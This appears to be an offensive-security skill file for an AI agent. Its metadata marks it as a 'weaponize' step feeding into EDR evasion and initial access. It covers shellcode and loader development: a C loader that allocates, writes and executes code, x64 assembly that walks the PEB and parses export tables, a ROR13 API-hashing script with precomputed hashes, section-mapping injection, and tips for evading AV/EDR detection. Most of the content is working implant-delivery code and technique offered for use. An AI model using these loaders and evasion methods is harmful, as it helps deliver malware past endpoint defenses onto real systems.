---
name: shellcode-dev
description: "Covers position-independent shellcode and loaders: PEB traversal, API hashing, null-byte avoidance, encoders, loaders, PE-to-shellcode, and cross-platform support. Signals: shellcode, pic, peb traversal."
zh-signals: "位置无关 shellcode 与 loader:PEB 遍历、API 哈希、空字节规避、编码器、loader、PE→shellcode、跨平台。信号:shellcode,pic,peb遍历。"
when-to-use: Use when writing position-independent shellcode or a loader — PEB walking, API hashing, null-byte avoidance, encoders, loaders, PE-to-shellcode conversion, cross-platform shellcode
metadata:
  type: offensive
  phase: exploitation
  tools: keystone, nasm, msfvenom, donut, srdi, pwntools
kill_chain:
  phase: [weaponize]
  step: [2]
  attck_tactics: [TA0042]
depends_on: [exploit-development, coding-mastery]
feeds_into: [edr-evasion, initial-access]
inputs: [target_architecture, payload_constraints]
outputs: [shellcode, loader, injector]
---

# Shellcode Development

## When to Activate

- Writing custom x86/x64 shellcode
- Implementing position-independent code (PIC)
- Building shellcode loaders for implant delivery
- Evading AV/EDR static detection
- Converting PE files to shellcode
- Cross-platform shellcode development

## Execution Pattern (Allocate-Write-Execute)

Avoid direct `PAGE_EXECUTE_READWRITE` — prefer two-step:

```c
// 1. Allocate with RW
char *dest = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
// 2. Write shellcode
memcpy(dest, shellcode, size);
// 3. Switch to RX (no write permission)
VirtualProtect(dest, size, PAGE_EXECUTE_READ, &old);
// 4. Execute
((void(*)())dest)();
```

## Position-Independent Code (PIC)

| Method | Platform | Notes |
|--------|----------|-------|
| Call/Pop | Windows | Push next addr, pop into register |
| FPU state (fstenv) | Windows | Saves instruction pointer |
| SEH | Windows | Exception handler stores EIP |
| RIP-relative | x64 | `lea rax, [rip+offset]` |
| GOT | Linux | Global Offset Table |
| VDSO | Linux | Kernel-provided shared object |

## Windows API Resolution (PEB Walk)

```nasm
; x64 PEB walk to find kernel32.dll base
find_kernel32:
    xor rcx, rcx
    mov rax, gs:[rcx + 0x60]       ; RAX = PEB
    mov rax, [rax + 0x18]          ; RAX = PEB->Ldr
    mov rsi, [rax + 0x20]          ; RSI = InMemoryOrderModuleList
    lodsq                           ; skip first entry (exe)
    xchg rax, rsi
    lodsq                           ; skip ntdll
    mov rbx, [rax + 0x20]          ; RBX = kernel32 base address
```

### Export Address Table (EAT) Parsing

```nasm
; Parse EAT to find GetProcAddress
    mov ebx, [rbx + 0x3C]          ; PE signature offset
    add rbx, r8                     ; PE header
    mov edx, [rbx + 0x88]          ; Export Directory RVA
    add rdx, r8                     ; Export Directory VA
    mov r10d, [rdx + 0x14]         ; NumberOfFunctions
    mov r11d, [rdx + 0x20]         ; AddressOfNames RVA
    add r11, r8                     ; AddressOfNames VA
    ; Loop through names, compare hash/string
```

### API Hashing (ROR13)

```python
# Generate hash for API name
def ror13_hash(name):
    hash_val = 0
    for c in name:
        hash_val = ((hash_val >> 13) | (hash_val << 19)) & 0xFFFFFFFF
        hash_val = (hash_val + ord(c)) & 0xFFFFFFFF
    return hash_val

# Common hashes:
# GetProcAddress: 0x7c0dfcaa
# LoadLibraryA:   0xec0e4e8e
# VirtualAlloc:   0x91afca54
# CreateProcessA: 0x863fcc79
```

## Null-Byte Avoidance

| Problem | Solution |
|---------|----------|
| `mov rax, 0` | `xor rax, rax` |
| `mov eax, 0x00000001` | `xor eax, eax; inc eax` |
| String with null terminator | Push string in reverse, use stack pointer |
| `add rsp, 0x200` | `sub rsp, 0xfffffffffffffdf8` (two's complement) |
| Zero in immediate | Use `sub` from known value, or XOR encoding |

## Shellcode Loaders

### Loader Responsibilities
1. Environment verification / keying (sandbox detection)
2. Shellcode decryption (XOR, RC4, AES)
3. Safe memory allocation and injection
4. Execution transfer

### Recommended Languages
- **Zig**: Small binary, no runtime, good for loaders
- **Rust**: Memory-safe, no runtime overhead
- **Nim**: Compiles to C, small binaries
- **Go**: Cross-platform but watch for runtime signatures

### Allocation Strategies

```c
// Two-step allocation (avoid RWX)
LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
memcpy(mem, shellcode, size);
VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);

// Alternative: Section mapping
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
NtMapViewOfSection(hSection, GetCurrentProcess(), &localView, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);
// Write shellcode to localView
NtMapViewOfSection(hSection, GetCurrentProcess(), &execView, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);
// Execute from execView
```

### Evasion Tips for Write Phase
- Prepend shellcode with dummy NOPs/garbage opcodes
- Split into chunks, write in randomized order
- Add random delays between writes
- Use `NtWriteVirtualMemory` instead of `memcpy` for remote injection

> 📎 Detailed content (full examples / references / data tables) has been split into `reference.md` in the same directory; use Read to load the relevant section on demand.
